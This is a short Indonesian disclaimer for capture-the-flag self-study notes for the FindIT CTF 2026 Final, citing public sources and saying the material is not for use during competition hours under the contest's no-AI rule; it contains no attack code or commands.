*Dokumen ini ditulis sebagai materi belajar mandiri untuk persiapan FindIT CTF 2026 Final. Semua teknik publicly documented di HackTricks, PayloadsAllTheThings, dan PortSwigger Academy. Tidak untuk digunakan selama jam kompetisi (10:00–17:00 WIB) karena melanggar aturan no-AI-LLM. Pelajari sekarang, eksekusi solo nanti.*
